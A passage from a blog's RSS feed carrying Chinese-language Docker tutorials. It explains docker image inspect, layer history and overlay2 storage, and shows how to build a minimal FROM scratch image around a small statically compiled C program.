&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; scratch&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;WORKDIR&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; /&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./say /&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; [&quot;/say&quot;]&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里，着重梳理一下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inspect&lt;/code&gt;。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inspect&lt;/code&gt;用于查看镜像的详细信息。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ docker image inspect say
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;Id&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;sha256:aa5bb1e797b5648a5c61618c0b6171a25189a2d6e18ec37b9466743a35945ab9&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;RepoTags&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;say:latest&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;RepoDigests&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;Parent&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;sha256:378b8f2564caa9bf6903179a94ae392776f77c2652dec3327889b34bfc742272&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;Comment&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;Created&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2021-11-05T05:02:17.489994051Z&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;Container&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;5acca3b69c9336715e078374b8cc00625325d1e93c0045be064d446ca1514e7e&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;ContainerConfig&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            ... ...
            &lt;span class=&quot;s2&quot;&gt;&quot;Cmd&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;-c&quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;#(nop) &quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;CMD [&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/say&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&quot;&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;Image&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;sha256:378b8f2564caa9bf6903179a94ae392776f77c2652dec3327889b34bfc742272&quot;&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;Volumes&quot;&lt;/span&gt;: null,
            &lt;span class=&quot;s2&quot;&gt;&quot;WorkingDir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;,
            ... ...
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;DockerVersion&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;20.10.9&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;Author&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
        &lt;span class=&quot;s2&quot;&gt;&quot;Config&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            ... ...
            &lt;span class=&quot;s2&quot;&gt;&quot;Cmd&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;/say&quot;&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;Image&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;sha256:378b8f2564caa9bf6903179a94ae392776f77c2652dec3327889b34bfc742272&quot;&lt;/span&gt;,
            ... ...
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
        ... ...
        &lt;span class=&quot;s2&quot;&gt;&quot;GraphDriver&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;Data&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;MergedDir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29c5883711aa15ca0b127e8df2482bfc00ed4e84c/merged&quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;UpperDir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29c5883711aa15ca0b127e8df2482bfc00ed4e84c/diff&quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;WorkDir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29c5883711aa15ca0b127e8df2482bfc00ed4e84c/work&quot;&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
            &lt;span class=&quot;s2&quot;&gt;&quot;Name&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;overlay2&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
       ... ...
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里，关注&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Parent&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GraphDriver&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Parent&lt;/code&gt;指的是该镜像的基础镜像，docker的镜像是一层一层叠加而来的，没执行&lt;strong&gt;Dockerfile&lt;/strong&gt;中的一条指令就会产生一个层镜像，可以使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker image history&lt;/code&gt;查看镜像的叠加关系。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ docker image &lt;span class=&quot;nb&quot;&gt;history &lt;/span&gt;say
IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
aa5bb1e797b5   2 hours ago   /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#(nop)  CMD [&quot;/say&quot;]                 0B&lt;/span&gt;
378b8f2564ca   2 hours ago   /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#(nop) COPY file:0ca1aaab19fa1703…   923kB&lt;/span&gt;
81ec91d2bac1   2 hours ago   /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#(nop) WORKDIR /                     0B&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inspect&lt;/code&gt;信息中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Parent: sha256:378b8f2564ca ... ...&lt;/code&gt;，同第二层镜像（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;378b8f2564ca   2 hours ago   /bin/sh -c #(nop) COPY file:0ca1aaab19fa1703… &lt;/code&gt;即&lt;strong&gt;COPY&lt;/strong&gt;操作）对应。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GraphDriver.Data&lt;/code&gt;指向目录&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29... ...&lt;/code&gt;，该目录是镜像的&lt;strong&gt;overlay2&lt;/strong&gt;存储目录。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29c5883711aa15ca0b127e8df2482bfc00ed4e84c
├── committed
├── diff
│   └── say
└── &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二层镜像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;378b8f2564ca&lt;/code&gt;的&lt;strong&gt;overlay2&lt;/strong&gt;存储目录同样指向目录&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29... ...&lt;/code&gt;，这是因为第三层镜像是执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMD&lt;/code&gt;得到的，没有更改镜像上的任何文件。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker image inspect 378b8 | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;overlay2&apos;&lt;/span&gt;
                &lt;span class=&quot;s2&quot;&gt;&quot;MergedDir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29c5883711aa15ca0b127e8df2482bfc00ed4e84c/merged&quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;UpperDir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29c5883711aa15ca0b127e8df2482bfc00ed4e84c/diff&quot;&lt;/span&gt;,
                &lt;span class=&quot;s2&quot;&gt;&quot;WorkDir&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/docker/overlay2/de4b43fcc2e259b223c2e5a29c5883711aa15ca0b127e8df2482bfc00ed4e84c/work&quot;&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;Name&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;overlay2&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而第一层镜像&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;81ec91d2bac1&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Parent&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GraphDriver.Data&lt;/code&gt;均为&lt;strong&gt;空&lt;/strong&gt;，这是应为&lt;strong&gt;say&lt;/strong&gt;镜像是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FROM scratch&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scratch&lt;/code&gt;是空镜像。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker image inspect 81ec91d2bac1
... ...
&lt;span class=&quot;s2&quot;&gt;&quot;Parent&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
... ...
&lt;span class=&quot;s2&quot;&gt;&quot;GraphDriver&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s2&quot;&gt;&quot;Data&quot;&lt;/span&gt;: null,
            &lt;span class=&quot;s2&quot;&gt;&quot;Name&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;overlay2&quot;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
... ...
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Thu, 12 May 2022 00:00:00 +0800</pubDate>
        <link>https://cheneyyin.github.io/2022/05/12/docker-image-command/</link>
        <guid isPermaLink="true">https://cheneyyin.github.io/2022/05/12/docker-image-command/</guid>
        
        <category>Docker</category>
        
        <category>docker image</category>
        
        <category>docker image inspect</category>
        
        <category>overlay2</category>
        
        
      </item>
    
      <item>
        <title>Docker构建镜像</title>
        <description>&lt;h1 id=&quot;docker构建镜像&quot;&gt;Docker构建镜像&lt;/h1&gt;

&lt;h2 id=&quot;1-build镜像方式&quot;&gt;1 build镜像方式&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker&lt;/code&gt;提供的镜像构建方式包括两种：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker commit&lt;/code&gt;命令从运行中的容器提交为镜像。&lt;/li&gt;
  &lt;li&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker build&lt;/code&gt;命令从&lt;strong&gt;Dockerfile&lt;/strong&gt;文件构建镜像。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;第一种方式这里不做赘述，第二种方式是最重要、最常用的方式。&lt;/p&gt;

&lt;h2 id=&quot;2-dockerfile构建镜像&quot;&gt;2 Dockerfile构建镜像&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;常用指令如下，&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;指令&lt;/th&gt;
      &lt;th&gt;说明&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FROM&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Dockerfile&lt;/strong&gt;除了注释第一行必须是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FROM&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FROM&lt;/code&gt;后面跟镜像名称，代表我们要基于哪个基础镜像构建。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RUN&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RUN&lt;/code&gt;后面跟一个具体的命令，类似于&lt;strong&gt;Linux&lt;/strong&gt;命令行执行命令。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ADD&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;拷贝本机文件或远程文件至镜像，压缩文件会被展开。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;COPY&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;拷贝本机文件至镜像内。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;USER&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;指定容器启动的用户。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENTRYPOINT&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;容器的启动命令。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMD&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMD&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENTRYPOINT&lt;/code&gt;指令提供默认参数，也可以单独使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CMD&lt;/code&gt;指定容器启动参数。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENV&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;指定容器运行时的环境变量，格式为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key=value&lt;/code&gt;。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARG&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;定义外部变量，构建镜像时可以使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;build-arg=&lt;/code&gt;的格式传递参数用于构建。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EXPOSE&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;指定容器监听的端口，格式&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[port]/tcp&lt;/code&gt;或者&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[port]/udp&lt;/code&gt;。&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WORKDIR&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;为&lt;strong&gt;Dockerfile&lt;/strong&gt;中跟在其后的所有命令设置工作目录。&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;3-tiny示例镜像制作&quot;&gt;3 Tiny示例镜像制作&lt;/h2&gt;

&lt;p&gt;这里，为大家演示如何使用&lt;strong&gt;Dockerfile&lt;/strong&gt;构建一个极为精简的镜像。&lt;/p&gt;

&lt;p&gt;首先，编写一段名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;say.c&lt;/code&gt;的代码，内容如下，&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;say:%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行编译。（这里使用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--static&lt;/code&gt;开启了静态链接，如果遵循动态链接，在打包镜像时还需要复制若干动态链接库文件，为了简化演示过程，这里使用了静态链接）&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;gcc &lt;span class=&quot;nt&quot;&gt;--static&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O2&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; say ./say.c
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;❯ &lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; ./say
904K	./say
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;./say
hello &lt;span class=&quot;c&quot;&gt;#输入&lt;/span&gt;
say:hello
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接下来编写&lt;strong&gt;Dockerfile&lt;/strong&gt;文件，&lt;/p&gt;

&lt;div class=&quot;language-dockerfile highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; scratch&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;WORKDIR&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; /&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;COPY&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; ./say /&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;CMD&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; [&quot;/say&quot;]&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

